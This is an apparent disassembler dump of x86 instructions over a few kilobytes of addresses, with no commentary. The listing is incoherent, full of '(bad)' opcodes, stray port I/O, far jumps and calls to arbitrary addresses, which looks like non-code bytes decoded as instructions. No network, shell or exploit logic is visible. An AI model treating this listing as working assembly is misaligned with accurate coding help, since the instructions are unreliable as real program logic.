  42254d:	outs   dx,DWORD PTR ds:[esi]
  42254e:	push   ecx
  42254f:	addr16 jle 0x422569
  422552:	or     eax,eax
  422554:	jb     0x422545
  422556:	pop    ebp
  422557:	test   eax,0xbe32c045
  42255c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42255d:	adc    ebx,DWORD PTR [ecx+0x68eadd6e]
  422563:	arpl   WORD PTR [ebp-0x51c7a139],ax
  422569:	sbb    BYTE PTR [esi+0x55781231],ch
  42256f:	sbb    eax,0xc944040d
  422574:	adc    BYTE PTR [esi+eax*4+0x11],0x25
  422579:	jle    0x4225cd
  42257b:	add    bl,BYTE PTR [esi-0x7d8efbf4]
  422581:	fwait
  422582:	fwait
  422583:	ret    0xf0e7
  422586:	mov    ecx,DWORD PTR [ecx+0x5b61cad3]
  42258c:	hlt    
  42258d:	inc    eax
  42258e:	pusha  
  42258f:	leave  
  422590:	test   eax,0x4e131722
  422595:	stc    
  422596:	out    dx,al
  422597:	add    eax,0x7e11f086
  42259c:	popf   
  42259d:	jle    0x422520
  42259f:	jle    0x422586
  4225a1:	inc    ebx
  4225a2:	sbb    al,0x13
  4225a4:	sub    eax,0xf5228f4c
  4225a9:	ins    DWORD PTR es:[edi],dx
  4225aa:	adc    DWORD PTR [edi+0x2a],0x21
  4225ae:	add    ch,dh
  4225b0:	inc    eax
  4225b1:	push   edx
  4225b2:	lds    eax,FWORD PTR [edi+0x45]
  4225b5:	mov    al,ds:0xb609e8fd
  4225ba:	sahf   
  4225bb:	fdivr  QWORD PTR [ebp-0x1b]
  4225be:	test   eax,0x196b3028
  4225c3:	cli    
  4225c4:	call   0xf164:0xfe192307
  4225cb:	cli    
  4225cc:	shl    DWORD PTR [edi],0x17
	...
  4225d7:	add    BYTE PTR [eax],al
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    ebx,eax
  4225e7:	(bad)  
  4225e9:	call   0x43c6c9
  4225ee:	std    
  4225ef:	add    DWORD PTR [eax],eax
  4225f1:	add    BYTE PTR [ebx+0x412019b5],cl
  4225f7:	xchg   esi,esp
  4225f9:	mov    eax,0x31bc8ce
  4225fe:	retf   0x54da
  422601:	adc    dh,al
  422603:	call   0x6ca3af12
  422608:	inc    esi
  422609:	push   ecx
  42260a:	inc    ebx
  42260b:	(bad)  
  42260d:	push   edx
  42260e:	and    BYTE PTR [esi+edi*4],0x1b
  422612:	cmovae ecx,DWORD PTR [edi+0x38b3edf8]
  422619:	pop    eax
  42261a:	cld    
  42261b:	rcl    DWORD PTR [ebp-0x4b],1
  42261e:	jge    0x4225e9
  422620:	adc    al,0x80
  422622:	stos   BYTE PTR es:[edi],al
  422623:	fcmovu st,st(1)
  422625:	dec    edi
  422626:	jmp    0xd4c0:0x900b4efe
  42262d:	mov    ch,0x7
  42262f:	aaa    
  422630:	xor    eax,0x18469374
  422635:	mov    BYTE PTR [eax-0x7e],cl
  422638:	lods   eax,DWORD PTR ds:[esi]
  422639:	jo     0x42263f
  42263b:	or     eax,DWORD PTR [ebx-0x56]
  42263e:	sub    ch,BYTE PTR [edx]
  422640:	xchg   edi,eax
  422641:	popa   
  422642:	sar    BYTE PTR [ecx+0x325177c8],1
  422648:	mov    ebx,0xa4108590
  42264d:	xchg   DWORD PTR [ebp+0x7],ebp
  422650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422651:	aam    0xf7
  422653:	mov    ecx,0x1dd5e6
  422658:	sub    cl,ch
  42265a:	push   es
  42265b:	sub    ebp,edi
  42265d:	dec    edi
  42265e:	bound  eax,QWORD PTR [esi+eiz*4]
  422661:	mov    esi,0xa697c32c
  422666:	cmp    ecx,edi
  422668:	ins    DWORD PTR es:[edi],dx
  422669:	xchg   ecx,eax
  42266a:	mov    dh,0x13
  42266c:	dec    esi
  42266d:	and    al,0xa3
  42266f:	pop    ds
  422670:	push   ds
  422671:	inc    ebp
  422672:	(bad)  
  422673:	sti    
  422674:	shl    ebx,1
  422676:	jle    0x4226df
  422678:	pop    ecx
  422679:	jns    0x42267a
  42267b:	in     al,0x97
  42267d:	adc    eax,0xa8ae44bd
  422682:	ins    DWORD PTR es:[edi],dx
  422683:	sar    BYTE PTR [edi],cl
  422685:	and    dh,bl
  422687:	arpl   sp,ax
  422689:	into   
  42268a:	or     eax,0x1e12f679
  42268f:	xor    BYTE PTR ds:0xb095ae2f,ah
  422695:	mov    ecx,0xf252aa15
  42269a:	fs out dx,eax
  42269c:	adc    al,0xfe
  42269e:	adc    al,0xeb
  4226a0:	add    DWORD PTR [ebp-0x36],esi
  4226a3:	push   ebp
  4226a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a5:	dec    ebp
  4226a6:	lock jle 0x42270d
  4226a9:	mov    bh,0xb0
  4226ab:	(bad)  
  4226ac:	fmul   QWORD PTR [edi-0x1d]
  4226af:	aam    0x8a
  4226b1:	xchg   esp,eax
  4226b2:	and    dl,bl
  4226b4:	xchg   DWORD PTR ds:[ebp+0x76],eax
  4226b8:	loope  0x422721
  4226ba:	jmp    0x422700
  4226bc:	pop    ebp
  4226bd:	and    edi,ebp
  4226bf:	mov    al,0x7e
  4226c1:	xor    DWORD PTR ds:0xa9c2b5ef,edx
  4226c7:	mov    esi,0xd9d7dac1
  4226cc:	mov    al,ds:0x7aec7bc1
  4226d1:	xchg   edx,eax
  4226d2:	(bad)  
  4226d3:	push   edx
  4226d4:	mov    al,0x9
  4226d6:	xor    DWORD PTR [edx],edx
  4226d8:	mov    DWORD PTR [edx+0xb3709cf],edx
  4226de:	ja     0x42272d
  4226e0:	cmp    ecx,0x40e748b9
  4226e6:	xchg   esi,eax
  4226e7:	sbb    DWORD PTR [ebp-0x33783dab],0x2199b1b1
  4226f1:	ins    DWORD PTR es:[edi],dx
  4226f2:	push   ebx
  4226f3:	pop    es
  4226f4:	pop    es
  4226f5:	and    al,0x10
  4226f7:	jne    0x42275d
  4226f9:	sbb    ebx,esp
  4226fb:	fistp  WORD PTR [bx-0x65]
  4226ff:	sbb    eax,0x80eade08
  422704:	rcl    bl,1
  422706:	sub    dl,BYTE PTR [ebp+eiz*2+0x4c6ddf81]
  42270d:	inc    edx
  42270e:	cmp    ah,al
  422710:	xor    BYTE PTR [esi+0x7b7ded1c],dl
  422716:	adc    dh,BYTE PTR [ecx-0x420ae338]
  42271c:	jg     0x4226fa
  42271e:	out    0x93,eax
  422720:	inc    esp
  422721:	into   
  422722:	jmp    0x4fc5:0xf4f27d87
  422729:	gs cmp al,0x78
  42272c:	xor    edx,DWORD PTR [edx-0x6dcc0688]
  422732:	mov    WORD PTR [edx+ebx*4],fs
  422735:	ficom  DWORD PTR [ebp-0x23b73483]
  42273b:	xor    edx,DWORD PTR [edi-0x35]
  42273e:	and    edx,esp
  422740:	xor    al,0x83
  422742:	mov    bl,0x1e
  422744:	jecxz  0x4227c0
  422746:	xor    eax,0x2cedd70a
  42274b:	pop    ecx
  42274c:	jg     0x4226fe
  42274e:	clc    
  42274f:	call   0x9866c38a
  422754:	ins    BYTE PTR es:[edi],dx
  422755:	int    0x4f
  422757:	test   BYTE PTR [ebp+0x7c],bh
  42275a:	clc    
  42275b:	mov    esp,0x5fa34a1f
  422760:	xor    cl,cl
  422762:	push   eax
  422763:	out    0xca,al
  422765:	out    dx,eax
  422766:	jbe    0x4227b2
  422768:	(bad)  
  422769:	fadd   QWORD PTR [edi+0x3295c89b]
  42276f:	push   ds
  422770:	sbb    BYTE PTR [edx-0x7b909244],0xf4
  422777:	rol    DWORD PTR [ebx-0x7c],0x47
  42277b:	push   ecx
  42277c:	add    DWORD PTR [edi+0x295f1a29],0x3a
  422783:	and    ah,BYTE PTR [bx+di]
  422786:	loop   0x422789
  422788:	cmp    DWORD PTR [edx],0x3a
  42278b:	enter  0xfc90,0xdd
  42278f:	push   eax
  422790:	cmp    eax,0xab5f94f3
  422795:	rcr    DWORD PTR [eax-0x553fa297],0x3e
  42279c:	add    BYTE PTR [edi-0x28],ch
  42279f:	xchg   DWORD PTR [ecx+edx*8],ebx
  4227a2:	js     0x42281a
  4227a4:	bound  ecx,QWORD PTR ds:0xeefafee7
  4227aa:	cmc    
  4227ab:	les    esi,FWORD PTR [ecx]
  4227ad:	daa    
  4227ae:	cwde   
  4227af:	xchg   eax,ebx
  4227b1:	sbb    eax,0xa306555b
  4227b6:	xor    BYTE PTR [esi+0x42],dl
  4227b9:	repnz inc ecx
  4227bb:	add    al,BYTE PTR [ecx-0x2c4aae31]
  4227c1:	ffree  st(6)
  4227c3:	icebp  
  4227c4:	or     bh,BYTE PTR [ebx]
  4227c6:	ja     0x422773
  4227c8:	inc    eax
  4227c9:	cmp    eax,DWORD PTR [ebp-0x6d2a33a4]
  4227cf:	xchg   BYTE PTR [edi-0x525f3fb6],ah
  4227d5:	push   es
  4227d6:	adc    eax,0xd019726e
  4227db:	fst    QWORD PTR [edi-0x1e]
  4227de:	dec    ebx
  4227df:	das    
  4227e0:	daa    
  4227e1:	sbb    eax,DWORD PTR [ebp-0x7e302c03]
  4227e7:	push   ebp
  4227e8:	in     eax,dx
  4227e9:	adc    eax,0xd07f0241
  4227ee:	icebp  
	...
  4227f7:	add    BYTE PTR [eax],al
  4227f9:	add    BYTE PTR [eax-0x11],cl
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx+0x3cffe210],ebx
  422808:	and    BYTE PTR [edi-0x28],al
  42280b:	mov    ds:0x1fd0001,al
  422810:	add    BYTE PTR [eax],al
  422812:	mov    edx,DWORD PTR [esi-0x7]
  422815:	out    0x9f,al
  422817:	cmp    ecx,ebp
  422819:	jno    0x4227e6
  42281b:	cmc    
  42281c:	mov    fs,ebp
  42281e:	fcmovu st,st(5)
  422820:	jne    0x4227f8
  422822:	shr    BYTE PTR gs:[ecx-0x7b23634c],1
  422829:	xchg   edx,eax
  42282a:	or     esp,ecx
  42282c:	inc    edi
  42282d:	inc    eax
  42282e:	xchg   esi,eax
  42282f:	es mov esi,0x468ef426
  422835:	lods   eax,DWORD PTR ss:[esi]
  422837:	dec    edi
  422838:	or     BYTE PTR [ecx-0x5d232fae],bh
  42283e:	les    ecx,FWORD PTR fs:[eax-0x1d]
  422842:	fisub  DWORD PTR [ecx+0x5ed38693]
  422848:	adc    ah,BYTE PTR [eax+0x2411d97]
  42284e:	div    esp
  422850:	sbb    eax,0xa6da84ae
  422855:	sub    al,0xc
  422857:	fs pop eax
  422859:	popa   
  42285a:	loopne 0x422804
  42285c:	pop    ebx
  42285d:	lock xchg BYTE PTR [ecx-0x64],bl
  422861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422862:	aam    0x16
  422864:	in     al,0x2e
  422866:	and    edi,ebp
  422868:	mov    bl,0xc9
  42286a:	push   esi
  42286b:	jmp    0xe864:0x6e783593
  422872:	pop    esi
  422873:	xor    ch,BYTE PTR [esi-0x5]
  422876:	leave  
  422877:	mov    dh,0x4e
  422879:	(bad)  
  42287a:	fisttp QWORD PTR [ebx-0xe]
  42287d:	cmp    al,BYTE PTR [ebx+0x29ba7eae]
  422883:	fcom   QWORD PTR [edi+edi*8]
  422886:	dec    BYTE PTR [edx]
  422888:	xchg   edi,eax
  422889:	test   BYTE PTR [eax+edx*1+0x1c],bl
  42288d:	nop    DWORD PTR [ebp-0x14]
  422891:	pop    esi
  422892:	js     0x4228c7
  422894:	sbb    al,0xe6
  422896:	mov    dl,0xd8
  422898:	test   BYTE PTR [ebp+edx*4+0x6e7e1b49],0x39
  4228a0:	outs   dx,BYTE PTR ds:[esi]
  4228a1:	(bad)  
  4228a2:	jge    0x4228b6
  4228a4:	pop    eax
  4228a5:	jecxz  0x4228b9
  4228a7:	fwait
  4228a8:	into   
  4228a9:	xor    eax,0x6025e80b
  4228ae:	xor    BYTE PTR [edx],0xd5
  4228b1:	iret   
  4228b2:	inc    esp
  4228b3:	dec    esp
  4228b4:	ss or  al,0xb0
  4228b7:	aam    0x58
  4228b9:	add    edi,DWORD PTR [edi-0x72]
  4228bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228bd:	mov    edx,0x3daaa8c0
  4228c2:	adc    eax,0xb60aac18
  4228c7:	retf   0xf9ae
  4228ca:	sub    eax,0x50fb0e1f
  4228cf:	lock ja 0x422906
  4228d2:	ds (bad) 
  4228d4:	and    ch,BYTE PTR [ebp+0x110ccf7c]
  4228da:	inc    edx
  4228db:	inc    esi
  4228dc:	movntq QWORD PTR ds:0x24df2882,mm2
  4228e3:	and    al,0x63
  4228e5:	scas   eax,DWORD PTR es:[edi]
  4228e6:	jns    0x422884
  4228e8:	ret    0x2af2
  4228eb:	sbb    DWORD PTR [ebp-0x2c],0x3bc44faa
  4228f2:	mov    bl,0x2d
  4228f4:	cdq    
  4228f5:	lahf   
  4228f6:	xor    ch,0xfe
  4228f9:	pop    edi
  4228fa:	fdiv   DWORD PTR [ebx+eiz*1+0x27]
  4228fe:	jns    0x422910
  422900:	xchg   esi,eax
  422901:	sti    
  422902:	sbb    eax,0x73ca5882
  422907:	lea    esi,[edx-0x7b3d0f82]
  42290d:	shr    BYTE PTR [ecx-0x2d],0x11
  422911:	cmp    ebp,DWORD PTR [edi-0x6]
  422914:	fimul  WORD PTR [eax-0x69]
  422917:	xchg   ebx,eax
  422918:	lahf   
  422919:	and    eax,0x70fa9c4a
  42291e:	outs   dx,DWORD PTR ds:[esi]
  42291f:	sahf   
  422920:	jmp    0xc19:0x5de96d89
  422927:	mov    cl,0x31
  422929:	jmp    0x422930
  42292b:	jge    0x4228dc
  42292d:	(bad)  
  42292e:	jmp    0x4229a6
  422930:	jne    0x4228c7
  422932:	mov    esi,0x5749386c
  422937:	stos   BYTE PTR es:[edi],al
  422938:	lds    ecx,FWORD PTR [edx]
  42293a:	shr    DWORD PTR [edx+0xc],0x3a
  42293e:	aam    0x96
  422940:	repz jl 0x422904
  422943:	adc    ecx,DWORD PTR [ebp+0x10fc7a74]
  422949:	pop    esp
  42294a:	mov    ah,0x38
  42294c:	add    BYTE PTR [ecx+0x44],dh
  42294f:	pop    es
  422950:	ret    
  422951:	retf   0x919a
  422954:	pop    es
  422955:	add    DWORD PTR [ecx+0x376cb8e8],esi
  42295b:	inc    eax
  42295c:	(bad)  
  42295d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42295e:	fcomp  DWORD PTR [ebp+0x4]
  422961:	add    ch,BYTE PTR [ebx-0x38a490b3]
  422967:	pop    eax
  422968:	push   eax
  422969:	cmp    eax,0x5c506df3
  42296e:	sub    BYTE PTR [ebx+ebx*2+0x65],dl
  422972:	xchg   DWORD PTR [ebx],esp
  422974:	sbb    al,0x25
  422976:	or     esi,ebp
  422978:	sbb    cl,ch
  42297a:	je     0x422906
  42297c:	jecxz  0x422936
  42297e:	nop    ecx
  422981:	mov    dh,0xb0
  422983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422984:	test   al,0x16
  422987:	fcom   DWORD PTR [ebx-0x48]
  42298a:	cmp    eax,DWORD PTR [edx+0x5a3bf427]
  422990:	and    al,0xf2
  422992:	stc    
  422993:	test   al,0x0
  422995:	ds xchg ebx,eax
  422997:	mov    ds:0xeb65a8b0,al
  42299c:	jnp    0x422962
  42299e:	imul   DWORD PTR [edi+0x71a4b11c]
  4229a4:	xchg   ebx,eax
  4229a5:	sub    cl,dl
  4229a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229a8:	xchg   edx,eax
  4229a9:	fimul  DWORD PTR [esi-0x66bf9ff4]
  4229af:	nop
  4229b0:	adc    cl,cl
  4229b2:	aaa    
  4229b3:	shl    DWORD PTR [esi+0x2b096d32],0xc7
  4229ba:	mov    edx,0xa3f62fb2
  4229bf:	or     cl,BYTE PTR [edi-0x44b085ca]
  4229c5:	xor    edi,DWORD PTR [ebx+0x47226001]
  4229cb:	test   BYTE PTR [ebx-0x4a01d03e],cl
  4229d1:	and    cl,bl
  4229d3:	xchg   ebp,eax
  4229d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229d5:	adc    BYTE PTR [esi],bl
  4229d7:	shr    BYTE PTR [edx],cl
  4229d9:	lds    edx,FWORD PTR [ecx+0x6e]
  4229dc:	lock mov dh,0xfb
  4229df:	xchg   esp,eax
  4229e0:	pusha  
  4229e1:	std    
  4229e2:	push   cs
  4229e3:	adc    BYTE PTR [edi+0x526ee145],cl
  4229e9:	adc    ebp,DWORD PTR ds:0x4633a10
  4229ef:	outs   dx,DWORD PTR ds:[esi]
  4229f0:	out    dx,eax
  4229f1:	stc    
  4229f2:	popf   
  4229f3:	and    BYTE PTR [edi-0x56],ch
  4229f6:	and    edi,edx
  4229f8:	and    eax,0xbeea8cf8
  4229fd:	lods   eax,DWORD PTR ds:[esi]
  4229fe:	inc    ebx
  4229ff:	sub    DWORD PTR ds:0x59e77e6,0xe32cd519
  422a09:	aam    0x29
  422a0b:	sbb    edx,DWORD PTR [ecx-0xb]
  422a0e:	inc    ecx
	...
  422a17:	add    BYTE PTR [eax],al
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	pop    edx
  422a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a28:	jge    0x4229d3
  422a2a:	aad    0xa4
  422a2c:	add    DWORD PTR [eax],eax
  422a2e:	std    
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    ch,ah
  422a33:	div    DWORD PTR [ebx-0x1d]
  422a36:	or     ecx,DWORD PTR [edi]
  422a38:	int    0x7a
  422a3a:	mov    bl,ah
  422a3c:	push   0xffffff85
  422a3e:	push   edi
  422a3f:	pop    esi
  422a40:	and    esi,esp
  422a42:	call   0x26adc36c
  422a47:	push   ds
  422a48:	jbe    0x422a6b
  422a4a:	repnz shl DWORD PTR [edx],0xd5
  422a4e:	dec    ebp
  422a4f:	cld    
  422a50:	jmp    0xd37a5d82
  422a55:	popa   
  422a56:	retf   
  422a57:	lods   eax,DWORD PTR ds:[esi]
  422a58:	cmp    bh,BYTE PTR [ecx-0x7295c737]
  422a5e:	retf   
  422a5f:	cmp    al,0xe3
  422a61:	dec    ebx
  422a62:	in     eax,dx
  422a63:	int    0x9b
  422a65:	lahf   
  422a66:	(bad)  
  422a67:	cmp    al,0xe7
  422a69:	cdq    
  422a6a:	xor    ebx,DWORD PTR [edx]
  422a6c:	arpl   WORD PTR [esi+0x6b],dx
  422a6f:	arpl   WORD PTR [edx-0x64],sp
  422a72:	cmp    eax,0x1f9009ec
  422a77:	imul   ebx,DWORD PTR [edi-0x29],0xcd91b05a
  422a7e:	push   ecx
  422a7f:	gs stos BYTE PTR es:[edi],al
  422a81:	sub    al,0xef
  422a83:	sbb    DWORD PTR ds:0x1eb9edb6,0xfccaec48
  422a8d:	es pusha 
  422a8f:	mov    BYTE PTR [eax+edi*1-0x19c46bca],ah
  422a96:	aaa    
  422a97:	test   BYTE PTR [ebx-0x2c],0x3d
  422a9b:	das    
  422a9c:	xor    BYTE PTR [esi-0x47278618],bl
  422aa2:	push   ebp
  422aa3:	mov    bl,0x75
  422aa5:	jmp    0x886d08ed
  422aaa:	stos   BYTE PTR es:[edi],al
  422aab:	div    DWORD PTR [esi+0x2f33be94]
  422ab1:	mov    ah,0xcc
  422ab3:	in     eax,dx
  422ab4:	xor    ecx,edx
  422ab6:	aam    0x62
  422ab8:	adc    dl,BYTE PTR [esi]
  422aba:	cmp    DWORD PTR [eax],esi
  422abc:	mov    ebx,0x4060de9c
  422ac1:	mov    bh,bl
  422ac3:	enter  0x2fa6,0xb2
  422ac7:	sub    dh,ch
  422ac9:	jo     0x422ab5
  422acb:	push   0x78709d93
  422ad0:	dec    eax
  422ad1:	dec    esp
  422ad2:	or     DWORD PTR [edi+0x45d7e9bc],esp
  422ad8:	sar    DWORD PTR [eax+0x2990bacf],cl
  422ade:	lea    ebx,[ecx]
  422ae0:	inc    esi
  422ae1:	retf   0xaf60
  422ae4:	mov    ah,0xe2
  422ae6:	fidiv  WORD PTR [edx]
  422ae8:	jns    0x422b22
  422aea:	inc    edx
  422aeb:	jecxz  0x422a95
  422aed:	(bad)  
  422aee:	call   0x19a366a1
  422af3:	jmp    0x745e:0x78a7e8b
  422afa:	jb     0x422b59
  422afc:	sbb    esi,DWORD PTR [esi+0x45]
  422aff:	push   0x74807149
  422b04:	outs   dx,BYTE PTR ds:[esi]
  422b05:	out    dx,al
  422b06:	dec    ecx
  422b07:	inc    ecx
  422b08:	ds and al,0xa4
  422b0b:	add    eax,0x662472b2
  422b10:	in     al,0x1c
  422b12:	xchg   BYTE PTR [esi+ebp*2],ch
  422b15:	outs   dx,DWORD PTR ds:[esi]
  422b16:	mov    bh,0xaf
  422b18:	xchg   esp,eax
  422b19:	cmp    al,0x67
  422b1b:	fisub  WORD PTR [edx-0x77]
  422b1e:	fld    QWORD PTR [esp+edx*4-0x61]
  422b22:	in     eax,dx
  422b23:	retf   0x2bfb
  422b26:	fisubr DWORD PTR [edi+0x624a9a9b]
  422b2c:	mov    esi,0xf16f1ea7
  422b31:	jp     0x422b2a
  422b33:	pushf  
  422b34:	add    eax,0xd4339973
  422b39:	and    BYTE PTR [ecx+0x3df74a55],cl
  422b3f:	ret    0x3cb1
  422b42:	rol    BYTE PTR [ecx],1
  422b44:	jbe    0x422b64
  422b46:	dec    ebx
  422b47:	adc    al,0x37
  422b49:	mov    al,ds:0xedd293ff
  422b4e:	retf   0x9560
  422b51:	xchg   ecx,eax
  422b52:	pusha  
  422b53:	jns    0x422bce
  422b55:	clc    
  422b56:	fdiv   st,st(2)
  422b58:	int    0xe0
  422b5a:	pop    ebp
  422b5b:	xor    bl,BYTE PTR [edx-0x1c]
  422b5e:	fild   DWORD PTR [ebx+0x362b8dd8]
  422b64:	popf   
  422b65:	icebp  
  422b66:	add    eax,0xbddb352b
  422b6b:	rcr    bl,0x78
  422b6e:	lods   al,BYTE PTR ds:[esi]
  422b6f:	loop   0x422bcf
  422b71:	leave  
  422b72:	jae    0x422b0b
  422b74:	xor    eax,0x42bfd794
  422b79:	out    dx,al
  422b7a:	jbe    0x422b83
  422b7c:	rcr    BYTE PTR [ecx],cl
  422b7e:	hlt    
  422b7f:	or     bl,BYTE PTR [esi]
  422b81:	lahf   
  422b82:	nop
  422b83:	push   ss
  422b84:	in     al,dx
  422b85:	sub    dh,ah
  422b87:	mov    dl,0xa1
  422b89:	inc    ebp
  422b8a:	mov    esp,0x4ee52b10
  422b8f:	in     al,0xe6
  422b91:	cmp    al,0x86
  422b93:	popf   
  422b94:	sar    BYTE PTR [ebx+0x396c9630],0x2d
  422b9b:	aas    
  422b9c:	repnz mov edi,0x377fa5d1
  422ba2:	fimul  DWORD PTR [ecx-0x3f14d73b]
  422ba8:	adc    eax,0x5013f3a2
  422bad:	mov    cl,0xc4
  422baf:	int    0x72
  422bb1:	push   es
  422bb2:	ret    
  422bb3:	cmp    BYTE PTR [ebp+eiz*8+0x70713f65],ah
  422bba:	(bad)  
  422bbb:	fist   DWORD PTR [ebx-0x7bb8340c]
  422bc1:	loopne 0x422bcf
  422bc3:	inc    edx
  422bc4:	sub    DWORD PTR [ecx+0x338126c4],edx
  422bca:	aas    
  422bcb:	mov    al,al
  422bcd:	daa    
  422bce:	ins    DWORD PTR es:[edi],dx
  422bcf:	inc    ebp
  422bd0:	in     eax,0xf0
  422bd2:	push   ss
  422bd3:	outs   dx,BYTE PTR es:[esi]
  422bd5:	pop    esi
  422bd6:	and    eax,0xf63e91c
  422bdb:	mov    ah,0x6b
  422bdd:	test   DWORD PTR [eax+0x55],eax
  422be0:	test   edx,esp
  422be2:	js     0x422b79
  422be4:	jbe    0x422bb7
  422be6:	push   ds
  422be7:	jp     0x422bf6
  422be9:	and    cl,BYTE PTR [eax-0x51]
  422bec:	xchg   edi,eax
  422bed:	mov    esi,0x7aa0d320
  422bf2:	fwait
  422bf3:	out    dx,eax
  422bf4:	out    0x46,al
  422bf6:	add    esi,0x72f28556
  422bfc:	inc    eax
  422bfd:	imul   eax,DWORD PTR [edi-0x56],0x66
  422c01:	add    ah,bh
  422c03:	scas   eax,DWORD PTR es:[edi]
  422c04:	mov    BYTE PTR [edi+eiz*1-0x3bc0c72a],cl
  422c0b:	ja     0x422c52
  422c0d:	nop
  422c0e:	add    DWORD PTR [eax-0x144eb36d],0xcf9aafdc
  422c18:	inc    edi
  422c19:	and    edi,DWORD PTR [ecx]
  422c1b:	pop    edx
  422c1c:	and    ecx,esi
  422c1e:	ss dec eax
  422c20:	sub    al,0x27
  422c22:	xchg   ebx,eax
  422c23:	cmp    al,0x53
  422c25:	test   BYTE PTR ds:0x5986fe65,ah
  422c2b:	mov    DWORD PTR cs:[eax],eax
  422c2e:	call   0x422c33
  422c33:	add    BYTE PTR [eax],al
  422c35:	add    BYTE PTR [eax],al
  422c37:	add    BYTE PTR [eax],al
  422c39:	add    BYTE PTR ds:0xbf06168e,dh
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    ebp,DWORD PTR [ebx-0x2dd47e32]
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	std    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    BYTE PTR [esi-0x11],al
  422c54:	add    DWORD PTR [edi+0x33189ccb],ebp
  422c5a:	lahf   
  422c5b:	pavgw  mm6,mm2
  422c5e:	ret    
  422c5f:	mov    fs,WORD PTR [edi-0x7635be43]
  422c65:	mov    ebx,0xc685100d
  422c6a:	aas    
  422c6b:	aam    0xf2
  422c6d:	pminsw mm2,QWORD PTR [eax-0x5f76adc6]
  422c74:	pop    ebx
  422c75:	mov    cl,0x80
  422c77:	sahf   
  422c78:	add    ecx,eax
  422c7a:	test   DWORD PTR ds:0xac8f9988,edi
  422c80:	adc    BYTE PTR [ecx+0x50b9e771],dl
  422c86:	mov    ecx,DWORD PTR [edx+0x4f9cbc55]
  422c8c:	mov    al,0xb7
  422c8e:	dec    edi
  422c8f:	imul   edi,DWORD PTR [ebp+0x77b81f66],0x7a
  422c96:	adc    al,0xb
  422c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c99:	test   al,0x47
  422c9b:	ret    
  422c9c:	fwait
  422c9d:	es nop
  422c9f:	or     ebp,0xbc311be8
  422ca5:	jno    0x422cd5
  422ca7:	or     al,0x68
  422ca9:	popf   
  422caa:	das    
  422cab:	jle    0x422c36
  422cad:	imul   ebx,DWORD PTR [edx+edx*4],0xdb723146
  422cb4:	out    dx,al
  422cb5:	inc    edx
  422cb6:	mov    edi,0xdbf1b129
  422cbb:	fwait
  422cbc:	lds    edx,FWORD PTR [esi]
  422cbe:	or     al,BYTE PTR [eax+ebp*4+0x2a4eb878]
  422cc5:	push   edx
  422cc6:	add    BYTE PTR [edx+0x79eaff5f],0x2e
  422ccd:	add    DWORD PTR [esi+eax*8],esp
  422cd0:	pop    ds
  422cd1:	pusha  
  422cd2:	out    dx,eax
  422cd3:	outs   dx,DWORD PTR ds:[esi]
  422cd4:	sub    BYTE PTR [esi-0x16ceb70],0x8e
  422cdb:	xchg   DWORD PTR [eax+0x17],ebx
  422cde:	cwde   
  422cdf:	or     BYTE PTR [ebx-0x2c],0x44
  422ce3:	and    ecx,DWORD PTR [edi-0x1c588c74]
  422ce9:	ror    DWORD PTR [edi+edx*4+0x5b],0x6d
  422cee:	mov    al,ds:0xe5b68d49
  422cf3:	and    DWORD PTR [esp+ebp*2+0x1221ff97],ebx
  422cfa:	adc    eax,0xc73bfa2d
  422cff:	jae    0x422d22
  422d01:	dec    esp
  422d02:	test   DWORD PTR [ecx+ebx*4-0x61d5d593],ebp
  422d09:	(bad)  
  422d0b:	push   0xffffffd6
  422d0d:	push   ebp
  422d0e:	xchg   ebp,eax
  422d0f:	pop    ss
  422d10:	test   al,0xaf
  422d12:	xor    eax,0x94657b9f
  422d17:	outs   dx,DWORD PTR ds:[esi]
  422d18:	xchg   edx,eax
  422d19:	sub    al,0x4e
  422d1b:	pop    es
  422d1c:	call   0x7fa19821
  422d21:	dec    eax
  422d22:	jmp    0x6851:0xd3120507
  422d29:	mov    ecx,0x779d25c8
  422d2e:	scas   al,BYTE PTR es:[edi]
  422d2f:	sub    DWORD PTR [edx],edi
  422d31:	lods   al,BYTE PTR ds:[esi]
  422d32:	popf   
  422d33:	mov    ch,bh
  422d35:	sub    bh,dl
  422d37:	ja     0x422cc9
  422d39:	cmp    dh,BYTE PTR [ebp-0x6fc8e0d9]
  422d3f:	das    
  422d40:	mov    ecx,0xce82de97
  422d45:	cmp    BYTE PTR [ecx+0x14],dh
  422d48:	(bad)  
  422d49:	cmp    eax,0xbf29ffde
  422d4e:	dec    esi
  422d4f:	and    DWORD PTR [eax+0x3ba4fac],ebx
  422d55:	inc    eax
  422d56:	lock xor bh,BYTE PTR [eax]
  422d59:	or     ch,BYTE PTR [esi]
  422d5b:	push   eax
  422d5c:	add    eax,0x92166be1
  422d61:	sbb    eax,0x67ecadc1
  422d66:	je     0x422d4e
  422d68:	mov    ah,0xee
  422d6a:	repz mov ah,0x6f
  422d6d:	xor    al,0xea
  422d6f:	dec    ebx
  422d70:	fisub  DWORD PTR [ebp-0x42a61ada]
  422d76:	add    eax,0x614ed4c4
  422d7b:	addr16 xchg ecx,eax
